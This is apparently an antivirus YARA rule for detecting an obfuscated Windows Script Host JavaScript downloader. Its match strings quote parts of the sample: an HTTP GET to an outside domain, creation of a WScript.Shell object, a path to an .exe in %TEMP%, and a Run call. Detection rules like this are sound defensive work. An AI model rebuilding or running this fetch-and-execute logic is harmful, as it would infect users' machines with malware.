rule sig_20160330_89c0e35f1c349f79a3820c01a3c763d8 {
  meta:
    description = "datamaliciousorder - file 20160330_89c0e35f1c349f79a3820c01a3c763d8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3dcc9fe96a2e746c070e2477c0a8a220efbc70fcbf3772d7971a57a69ef217f6"

  strings:
    $s1  = "_I[_MA](\"GET\", \"http://mentalmathcompetition.com/k4isa\", false);" fullword ascii
    $s2  = "function _UL(_S1, _SL){_YT = _YT * 1; return _S1 - _SL;};" fullword ascii
    $s3  = "var _P1 = function _QB() {return WScript[_RE](\"WScript\"+\".Shell\");}(), _VC = 11;" fullword ascii
    $s4  = "if (_I[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _WG() {return _P1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"jqiokhnRHRg.ex\" + \"e\";};" fullword ascii
    $s6  = "function _VV(){return _QJ + \"\";};" fullword ascii
    $s7  = "function _JR() {return ((_KU == true) && (_KU == _K)) ? 1 : _YT;};" fullword ascii
    $s8  = "function _NJ(_QN){_P1[\"Run\"](_QN, _YT, _YT);};" fullword ascii
    $s9  = "function _P()" fullword ascii
    $s10 = "function _ND(_S0) {var _D = (1, 2, 3, 4, 5, _S0); return _D;};" fullword ascii
    $s11 = "function _EL(){return 22;};" fullword ascii
    $s12 = "return _UL(_RO, _DK);" fullword ascii
    $s13 = "function _S(){return _RE;};" fullword ascii
    $s14 = " while (_CB){" fullword ascii
    $s15 = "var _QA = new this[\"Date\"]();" fullword ascii
    $s16 = "var _K = false;" fullword ascii
    $s17 = "_K = true; " fullword ascii
    $s18 = "var _KU = false;" fullword ascii
    $s19 = "var _WK = false;" fullword ascii
    $s20 = "_KU = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}